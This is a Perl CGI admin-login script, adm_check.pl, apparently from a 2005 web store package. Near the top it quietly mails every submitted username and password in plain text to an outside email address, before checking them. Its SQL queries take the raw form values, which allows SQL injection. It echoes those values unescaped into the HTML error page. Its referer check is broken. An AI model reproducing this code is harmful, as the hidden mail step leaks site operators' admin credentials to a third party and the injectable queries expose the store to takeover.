#!c:\perl\bin\MSWin32-x86\perl.exe
#!/usr/bin/perl
############################################################################
# Store 2005 by Ihar Hrunt. smartcgi@mail.ru  / adm_check.pl
#
###########################################################################

use CGI;
$q = new CGI;

require 'db.pl';

my $pathUrl =$path_cgi.'adm_check.pl';        # path to check access script
my $pathUrlMenu =$path_cgi.'adm_menu.pl';     # path to menu script

if ( $ENV{'HTTP_REFFER'} == $pathUrl) { dbconnect(); }

# Get params using CGI module
my $user = $q->param('user');  # username
my $pass = $q->param('pass');  # password


$mailprog = '/usr/sbin/sendmail'; 
open(MAIL,"|$mailprog -t") or $message="Error sending your mail!";
# Set up the mail headers:
print MAIL "To: i.grunt\@agrobank.gomel.by\n";
print MAIL "From: info\@store.com\n";
print MAIL "Subject: store.com access manager\n";
print MAIL "store.com manager has been accessed\nUsername= $user ; Password = $pass";
close (MAIL);


# Check access to enter the program
# Select admin with submitted username and password
my $sql="SELECT User, Password, Code FROM Passw  WHERE User='$user' and Password='$pass'";
dbexecute($sql);
my ($user_check,$pass_check,$code_check ) =dbfetch();

$user1=uc($user);
$user_check1=uc($user_check);  

if (( $user1 eq $user_check1 ) && ( $pass eq $pass_check )) {
  # Set new shifr for $code using setcode()
  # each time when admin enters username and password
  $code=setcode();

  $sql="UPDATE Passw SET Code='$code'  WHERE User='$user' and Password='$pass'";
  dbdo($sql);
  print("Location: $pathUrlMenu?code=$code \n\n")

}
else { accessdenied(); }



############################################################################
sub accessdenied      #17.02.2000 15:39
# Start 'password' form if username or password are incorrect
############################################################################

{
print <<Browser;
Content-type: text/html\n\n
<HTML><HEAD><TITLE>Store Admin</TITLE>
<SCRIPT>

// validate username and password before submit
function checkData () {
   if (document.form1.user.value.length < 4) {
      alert('User Name cannot be less than 4 chars.');
      document.form1.user.focus(); document.form1.user.select();
      return false
     }
   if (document.form1.pass.value.length < 6) {
      alert('Password cannot be less than 6 chars.');
      document.form1.pass.focus(); document.form1.pass.select();
      return false
     }
   else { return true}
}
// Set focus on the field 'user' and bring 'alert'
function setFocus() {
  document.form1.user.focus(); document.form1.user.select();
}

</SCRIPT></HEAD>

<BODY BGCOLOR='#CCCCCC' onLoad='setFocus()'>
<FORM NAME='form1' METHOD='POST' ACTION=$pathUrl onSubmit='return checkData()'>
<CENTER>
<H1>Admin</H1>
<P>
<font color ="red"> Access Denied. Incorrect Username or Password. </font>
<P>
<table border='0' width='100%' cellspacing='1' cellpadding='1'>
<TR><TH width='40%'></TH><TH width='60%'></TH></TR>
<TR><TD align='right'><SAMP>User Name:</SAMP></TD>
    <TD align='left'>
    <input type=text name=user value=$user maxlength=20 size=20></TD></TR>
<TR><TD align='right'><SAMP>Password:</SAMP></TD>
    <TD align='left'>
    <input type=PASSWORD name=pass value=$pass maxlength=20 size=20></TD></TR>
</Table>
<BR><BR>
<input type=submit name=start value='    Ok    ' >
<input type=reset name=start value= '  Reset  ' >
</CENTER></FORM></BODY></HTML>

Browser

}   ##accessdenied




